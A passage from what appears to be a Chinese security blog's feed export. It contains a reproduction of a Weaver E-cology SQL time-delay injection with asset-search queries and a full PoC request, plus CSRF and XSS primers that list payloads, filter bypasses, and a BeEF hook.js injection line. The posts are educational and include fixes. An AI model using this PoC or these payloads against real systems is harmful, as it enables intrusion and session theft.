class="line">driver.switch_to.alert.accept()</span><br></pre></td></tr></table></figure><h2 id="4-参考文章"><a href="#4-参考文章" class="headerlink" title="4.参考文章"></a>4.参考文章</h2><p><a href="https://blog.csdn.net/wangqiang_cyou/article/details/128900832">https://blog.csdn.net/wangqiang_cyou/article/details/128900832</a></p><p><a href="https://blog.csdn.net/u013454322/article/details/128399381">https://blog.csdn.net/u013454322/article/details/128399381</a></p><p><a href="https://blog.csdn.net/beichanbb/article/details/122240155?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168917719716800227438372%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168917719716800227438372&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122240155-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=selenium%20find_element&spm=1018.2226.3001.4187">selenium中的find_element方法</a></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</title>
      <link href="/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/12/%E6%B3%9B%E5%BE%AEE-cology%20sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-15672)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现"><a href="#泛微E-cology-sql延时注入漏洞-QVD-2023-15672-复现" class="headerlink" title="泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现"></a>泛微E-cology sql延时注入漏洞(QVD-2023-15672)复现</h1><p>参考文章:</p><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p><h2 id="1-产品简介"><a href="#1-产品简介" class="headerlink" title="1.产品简介"></a>1.产品简介</h2><p>泛微E-cology系统是中国泛微网络科技股份有限公司（以下简称“泛微科技”）开发的一种企业级协同办公平台。该系统以办公自动化和协同办公为核心，提供了一系列功能和工具，帮助企业实现信息管理、流程管控、团队协作和业务应用等多方面的需求。</p><p>泛微E-cology系统具有以下主要特点和功能：</p><ol><li>办公自动化：系统支持企业内部的各种办公流程自动化，包括审批流程、请假流程、报销流程等，提高工作效率和减少重复性工作。</li><li>协同办公：系统提供了团队协作、文档分享和讨论等功能，便于员工之间的信息共享和协调，增强团队合作和沟通效率。</li><li>企业信息管理：系统可以集中管理企业的人员信息、组织架构、项目信息等重要数据，方便企业对信息进行统一管理和查询。</li><li>业务应用扩展：系统支持自定义业务应用的开发和集成，可以根据企业的实际需求定制特定的应用模块，满足企业的个性化需求。</li><li>安全性和权限控制：系统具备严格的权限管理和安全机制，确保用户数据的安全性和访问控制。</li></ol><p>泛微E-cology系统适用于各类企业和组织，可以帮助企业优化流程、提高工作效率、加强团队协作，提升整体管理水平。同时，泛微科技也不断进行技术创新和产品优化，以满足不同企业的个性化需求。</p><h2 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a>2.漏洞概述</h2><p>泛微E-cology的延时SQL注入漏洞可以被攻击者利用来获取未经授权的数据库访问权限，窃取敏感数据、修改数据或者执行其他恶意操作。攻击者可以通过构造特定的注入字符串，操纵应用程序的数据库查询，以达到攻击目的。</p><p>延时SQL注入漏洞的危害在于，它可能导致敏感数据泄露、系统崩溃、业务中断，甚至可能为攻击者提供全面的控制权限，从而危害企业的信息安全和业务运作。</p><h2 id="3-影响范围"><a href="#3-影响范围" class="headerlink" title="3.影响范围"></a>3.影响范围</h2><p>E-cology 9.x 补丁版本 &lt; 10.58.0</p><p>E-cology 8.x 补丁版本 &lt; 10.58.0</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4.复现过程"></a>4.复现过程</h2><p>1.资产检索</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">鹰图:web.icon=&quot;41eca7a9245394106a09b2534d8030df&quot;</span><br><span class="line">fofa:app=&quot;泛微-协同商务系统&quot;</span><br></pre></td></tr></table></figure><p>2.漏洞复现</p><p>访问搜索到的资产</p><p>尝试访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ip]/weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A8%27&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure><p>发现sleep8秒后加载内容</p><p>加载8秒后成功加载:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121245154.png"></p><p>验证成功。</p><p>Poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.FileDownloadForOutDoc?fileid=1+WAITFOR+DELAY%270%3A0%3A7%27&amp;isFromOutImg=1HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a>5.修复方案</h2><p>临时解决方案:</p><p>限制访问来源地址，如非必要，不要将系统开放在互联网上。</p><p>升级修复方案:</p><p>官方已发布安全补丁,建议受影响用户尽快升级至10.58及以上版本</p><p><a href="https://www.weaver.com.cn/cs/securityDownload.asp#">https://www.weaver.com.cn/cs/securityDownload.asp#</a></p><h2 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h2><p><a href="https://blog.csdn.net/qq_41904294/article/details/131666128?spm=1001.2014.3001.5502">泛微E-Cology SQL注入漏洞复现（QVD-2023-15672）</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础</title>
      <link href="/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/11/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="1-CSRF基础"><a href="#1-CSRF基础" class="headerlink" title="1.CSRF基础"></a>1.CSRF基础</h2><p>CSRF（Cross-Site Request Forgery），也称为跨站请求伪造，是一种常见的Web应用程序安全漏洞。它利用了Web应用程序对用户请求的信任，攻击者通过欺骗用户在受害者身份下执行恶意操作。</p><p>CSRF攻击的基本过程如下：</p><ol><li>用户登录：用户在一个网站A上进行登录，网站A会为其分配一个会话（session）。</li><li>恶意网站：用户后续浏览其他网站时，访问了一个恶意网站B。</li><li>伪造请求：恶意网站B会构造一个请求，该请求会针对用户在网站A上的身份进行操作，例如修改密码、转账等。</li><li>伪装请求：恶意网站B使用各种技术手段，如隐藏表单、图片标签或者通过Ajax请求等，将这个伪造的请求发送给网站A。</li><li>用户误操作：由于用户已经登录了网站A并信任该网站，浏览器会在不知情的情况下发送伪造请求，并执行恶意操作。</li></ol><p>CSRF攻击的危害取决于受到攻击的网站的业务逻辑和用户权限。该漏洞可能导致用户账户被盗、敏感信息泄露、非授权操作等。为了防范CSRF攻击，开发者可以采取一些措施，如使用CSRF令牌、验证Referer头、双重因素身份验证等。</p><p>漏洞危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具体功能决定危害程度</span><br><span class="line">修改性别 / 个人信息等</span><br><span class="line">修改管理员密码</span><br><span class="line">添加管理员</span><br><span class="line">后台getshell</span><br></pre></td></tr></table></figure><h2 id="2-CSRF防御"><a href="#2-CSRF防御" class="headerlink" title="2.CSRF防御"></a>2.CSRF防御</h2><p>1.验证HTTP Referer字段<br>2.添加Token字段并验证<br>3.添加自定义字段并验证</p><h2 id="3-CSRF漏洞检测"><a href="#3-CSRF漏洞检测" class="headerlink" title="3.CSRF漏洞检测"></a>3.CSRF漏洞检测</h2><p>漏洞检测:<br>a.敏感功能缺乏csrf防护机制</p><ol><li>在burpsuite中观察post请求是否带有随机Token 和 验证码</li><li>再判断 去掉&#x2F;修改 Referer后是否仍然可以提交成功</li></ol><p>b.网站可以允许写入csrf payload</p><ol><li>测试用户头像<code>&lt;img&gt;</code> &#x2F; 富文本区域的<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>标签(可控)</li><li>插入payload</li></ol><p>挖掘思路:<br>1.是否存在token和验证码,是否可以删除或伪造<br>2.是否可以删除或伪造referer<br>3.&lt;img&gt;&#x2F;&lt;svg&gt;等标签链接是否可控</p><p>常见漏洞点<br>1.修改密码 2.修改个人信息 3.发布文章 4.与账号相关的大部分业务功能点</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS基础</title>
      <link href="/2023/07/09/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/09/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h1><p>XSS（跨站脚本攻击）是一种常见的Web应用程序安全漏洞，攻击者通过注入恶意脚本代码来利用该漏洞。下面是XSS漏洞的渲染过程：<br>    1.用户输入：攻击者通常通过网站上的输入字段（如表单、URL参数等）提供恶意脚本代码。<br>    2.服务器渲染：用户输入的数据在服务器端被接收，并在动态内容被生成和渲染页面之前进行处理。<br>    3.脚本注入：如果服务器端没有对用户输入进行适当的过滤和验证，恶意脚本代码将被注入到最终生成的HTML页面中。<br>    4.浏览器解析：用户访问该页面时，浏览器会解析HTML，并执行其中的JavaScript代码。<br>    5.恶意执行：恶意脚本代码执行，可能导致活动篡改、窃取个人敏感信息、会话劫持等危害。</p><h2 id="1-XSS种类："><a href="#1-XSS种类：" class="headerlink" title="1.XSS种类："></a><strong>1.XSS种类：</strong></h2><p>反射（主动触发<br>dom（主动触发<br>存储型（被动触发</p><h3 id="1-1-反射型"><a href="#1-1-反射型" class="headerlink" title="1.1.反射型"></a>1.<strong>1.反射型</strong></h3><p><strong>GET型</strong><br>创造一触发xss的页面后让其他用户点击</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?message = <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?meseage = <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>POST型</strong><br>在post date里输入攻击代码</p><hr><h3 id="1-2-存储型"><a href="#1-2-存储型" class="headerlink" title="1.2.存储型"></a><strong>1.2.存储型</strong></h3><p>一般会把代码放在数据库中，危害很大<br>每个点击的用户都会被动触发<br>多留言板、弹幕、论坛</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>aha</span><br></pre></td></tr></table></figure><hr><h3 id="1-3-DOM型"><a href="#1-3-DOM型" class="headerlink" title="1.3.DOM型"></a>1.<strong>3.DOM型</strong></h3><p>dom型<br>和js有互动<br><strong>DOM-xss-1</strong></p><p>用js和前端进行互动</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法一<br>闭合写新标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> = <span class="string">&#x27;#&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span> &#x27;&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span> = <span class="string">&quot;alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法二<br>javascript协议</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DOM-xss-x</strong></p><p>输入一个参数会被页面上的某些js函数进行处理，处理后再显示到页面<br>这种情况需要对js处理函数进行分析,构造payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">if</span>=<span class="string">&quot;xssd_main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function domxss()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var str = window.location.search;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var xss = txss.replace(/\+/g,&#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            alert(xss);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.getElementById(&quot;dom&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+xss+&quot;&#x27;</span>&gt;</span>就让往事随风吧，都随风吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">#&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(1)&quot;</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">&lt;<span class="attr">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="2-XSSpayload构造"><a href="#2-XSSpayload构造" class="headerlink" title="2.XSSpayload构造"></a>2.XSSpayload构造</h2><h3 id="2-1常用标签"><a href="#2-1常用标签" class="headerlink" title="2.1常用标签"></a>2.1常用标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br><span class="line">&lt;body onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div onclick=&quot;alert(1)&quot;&gt;h&lt;/div&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class="line">&lt;object onclick=&quot;alert(1)&quot;&gt;123&lt;/object&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;alert(1)&quot; autofocus&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(1)&quot;&gt;click!&lt;/button&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2常用on事件"><a href="#2-2常用on事件" class="headerlink" title="2.2常用on事件"></a>2.2常用on事件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onclick=点击触发</span><br><span class="line">onload=加载触发</span><br><span class="line">onerror=报错触发</span><br><span class="line">onfocus=获得焦点触发</span><br><span class="line">onblur=失去焦点触发</span><br><span class="line">onmouseover=鼠标悬停</span><br><span class="line">onkeydown= onkeypress= onkeyup=  键盘操作触发</span><br><span class="line">onchange=内容改变触发</span><br><span class="line">onscroll=滚动条滚动触发</span><br></pre></td></tr></table></figure><h3 id="2-3常用测试函数"><a href="#2-3常用测试函数" class="headerlink" title="2.3常用测试函数"></a>2.3常用测试函数</h3><p>src挖掘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log()</span><br></pre></td></tr></table></figure><p>弹窗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert()</span><br><span class="line">confirm()</span><br><span class="line">prompt()</span><br></pre></td></tr></table></figure><h2 id="4-常用绕过方式"><a href="#4-常用绕过方式" class="headerlink" title="4.常用绕过方式"></a>4.常用绕过方式</h2><p>1.大小写绕过</p><p>外部标签无视大小写，内部的js代码是大小写敏感的</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scRiPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p>3.注释绕过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    --&gt;</span></span><br><span class="line">&lt;scr<span class="comment">&lt;!-- abc --&gt;</span>ipt&gt;alert<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.过滤圆括号(),用反引号&#96;&#96;替代</p><p>5.使用svg实体字符编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.换行逃逸js匹配</p><p>7.单标签不写右标签</p><p>8.输入内容全大写- 远程js</p><p>9.使用长英语绕过</p><p>10.编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;() 尝试单词或多次url编码</span><br><span class="line">&quot;[内容]&quot; 双引号的内容尝试unicode编码</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt; base64编码</span><br></pre></td></tr></table></figure><p>11.payload长度受限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.短域名</span><br><span class="line">2.&lt;svg/onload=alert(1)</span><br></pre></td></tr></table></figure><p>12.空格绕过<br>用+或&#x2F;**&#x2F;</p><h2 id="5-XSS危害与防御"><a href="#5-XSS危害与防御" class="headerlink" title="5.XSS危害与防御"></a>5.XSS危害与防御</h2><p>XSS危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盗取cookie</span><br><span class="line"></span><br><span class="line">植入键盘记录器。</span><br><span class="line"></span><br><span class="line">攻击受害者所在的局域网。</span><br><span class="line"></span><br><span class="line">代理转发流经被攻击者的所有 Web 流量，即实施中间人攻击。</span><br><span class="line"></span><br><span class="line">窃取或篡改应用 cookie 用于会话劫持。</span><br><span class="line"></span><br><span class="line">更改被攻击者 Web 应用的显示内容。</span><br><span class="line"></span><br><span class="line">绕过 CSRF 安全防护措施。</span><br><span class="line"></span><br><span class="line">创建包含恶意 JavaScript 代码的虚假网站以及到该网站页面的链接。</span><br><span class="line"></span><br><span class="line">发送嵌入恶意 Web URL 的电子邮件。</span><br><span class="line"></span><br><span class="line">使用 URL 短码隐蔽真实 URL。</span><br></pre></td></tr></table></figure><p>XSS防御</p><p><a href="https://zhuanlan.zhihu.com/p/262038810">https://zhuanlan.zhihu.com/p/262038810</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html回显内容在html页面标签之外时，实体化左右尖括号</span><br><span class="line">html回显内容在&lt;script&gt;代码快时，实体化左右尖括号、“/”、单引号等可能闭合标签的字符</span><br><span class="line">html回显内容通过postmessage作为输入点时 检测messageEvent的来源是否在白名单内，同时检测来源数据是否合法，是否存在恶意代码</span><br></pre></td></tr></table></figure><h2 id="6-XSS平台"><a href="#6-XSS平台" class="headerlink" title="6.XSS平台"></a>6.XSS平台</h2><h3 id="1-beef-xsss"><a href="#1-beef-xsss" class="headerlink" title="1.beef-xsss"></a>1.beef-xsss</h3><h4 id="1-安装登录"><a href="#1-安装登录" class="headerlink" title="1.安装登录"></a>1.安装登录</h4><p>安装beef-xss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">beef-xss 之后默认走流程</span><br><span class="line"></span><br><span class="line">beef-xss打开</span><br><span class="line">在<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>/ui/authentication登录</span><br></pre></td></tr></table></figure><p>默认用户名beef 密码pass</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p>src 连接到本地beef-xss</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.89.129:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行后beef-xss上线<br>找到对方的前端代码，然后插入自己的js攻击代码<br>Current Browser → Commands 可以运行多种命令</p><h3 id="2-xss-pt"><a href="#2-xss-pt" class="headerlink" title="2.xss.pt"></a>2.xss.pt</h3><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p><p>创建项目</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101339963.png" alt="img"></p><p>选择相应模式后会返回payload</p><p>将payload运行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101345101.png" alt="img"></p><h2 id="7-常用工具推荐"><a href="#7-常用工具推荐" class="headerlink" title="7.常用工具推荐"></a>7.常用工具推荐</h2><h3 id="1-XSStrike"><a href="#1-XSStrike" class="headerlink" title="1.XSStrike"></a>1.XSStrike</h3><p>项目地址:<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python xsstrike.py</span><br><span class="line"></span><br><span class="line">usage: xsstrike.py [-h] [-u TARGET] [--data DATA] [-t THREADS] [--seeds SEEDS] [--json] [--path]</span><br><span class="line">                   [--fuzzer] [--update] [--timeout] [--params] [--crawl] [--blind]</span><br><span class="line">                   [--skip-dom] [--headers] [--proxy] [-d DELAY] [-e ENCODING]</span><br><span class="line"> </span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -u, --url             target url</span><br><span class="line">  --data                post data</span><br><span class="line">  -f, --file            load payloads from a file</span><br><span class="line">  -t, --threads         number of threads</span><br><span class="line">  -l, --level           level of crawling</span><br><span class="line">  -t, --encode          payload encoding</span><br><span class="line">  --json                treat post data as json</span><br><span class="line">  --path                inject payloads in the path</span><br><span class="line">  --seeds               load urls from a file as seeds</span><br><span class="line">  --fuzzer              fuzzer</span><br><span class="line">  --update              update</span><br><span class="line">  --timeout             timeout</span><br><span class="line">  --params              find params</span><br><span class="line">  --crawl               crawl</span><br><span class="line">  --proxy               use prox(y|ies)</span><br><span class="line">  --blind               inject blind xss payloads while crawling</span><br><span class="line">  --skip                skip confirmation dialogue and poc</span><br><span class="line">  --skip-dom            skip dom checking</span><br><span class="line">  --headers             add headers</span><br><span class="line">  -d, --delay           delay between requests</span><br></pre></td></tr></table></figure><h3 id="2-XSSpayload"><a href="#2-XSSpayload" class="headerlink" title="2.XSSpayload"></a>2.XSSpayload</h3><p>一种xss fuzz爆破方式<br><a href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload</a><br>放入payload看弹窗数字确定payload行数。</p><h3 id="3-Burpsuite-XSS-Validator插件"><a href="#3-Burpsuite-XSS-Validator插件" class="headerlink" title="3.Burpsuite XSS Validator插件"></a>3.Burpsuite XSS Validator插件</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p>1.phantomjs下载<br><a href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a><br>将phantomjs所在的bin目录添加到环境变量<br>下载xss.js,将其放到和phantomjs.exe一个目录中</p><p><a href="https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js">https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js</a></p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phantomjs.exe xss.js</span><br></pre></td></tr></table></figure><p>2.安装插件</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101352302.png" alt="img"></p><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><p>1.用bp抓包send to intruder</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101428475.png"></p><p>2.配置变量</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101430632.png"></p><p>3.配置GREP-MATCH</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101433439.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101434106.png"></p><p>4.启动扫描</p><p>参考文章:</p><p><a href="https://www.freesion.com/article/77561513173/">burpsuite插件xssValidator的安装及使用（XSS自动扫描工具）</a></p><h3 id="4-payload大全"><a href="#4-payload大全" class="headerlink" title="4.payload大全"></a>4.payload大全</h3><p><a href="https://www.cnblogs.com/xiaozi/p/7268506.html">XSSpayload大全</a></p><h2 id="8-参考文章"><a href="#8-参考文章" class="headerlink" title="8.参考文章"></a>8.参考文章</h2><p><a href="https://wiki.sheep0818.xyz/doc/151/">XSS CSRF SSRF</a></p><p><a href="https://www.52dianzi.com/category/article/37/625025.html">Xss Bypass备忘录</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫实战-爬取爱企查企业数据</title>
      <link href="/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>​爱企查是百度推出的企业信息查询工具，可快速查询企业相关信息。在平时测试时，测试人员需要收集大量的企业信息，可以借助爬虫爬取爱企查网站实现。</p><p>​在挖通用型CNVD时 ，一般需要满足企业注册资金在5000w以上，本文演示爬取满足注册资金在5000w以上的企业信息。</p><h1 id="2-分析思路"><a href="#2-分析思路" class="headerlink" title="2.分析思路"></a>2.分析思路</h1><p>1.登录爱企查，筛选企业类型为</p><ul><li>注册资金在5000万以上</li><li>资本类型为人民币</li><li>企业状态为开业</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011543018.png"></a></p><p>2.进入网站后尝试从源码中取出广州市荔湾区华强电动设备行越秀分行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544160.png" alt="image.png"></p><p>发现查询失败：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544919.png" alt="image.png"></p><p>尝试f12抓包看请求<br>发现包内容过多。</p><p>3.选择去爬企业名称和注册资本</p><p>点击下方的页面索引：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011545837.png" alt="image.png"></p><p>查看抓到的包的访问payload<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546571.png" alt="image.png"></p><p>尝试多访问几页<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546613.png" 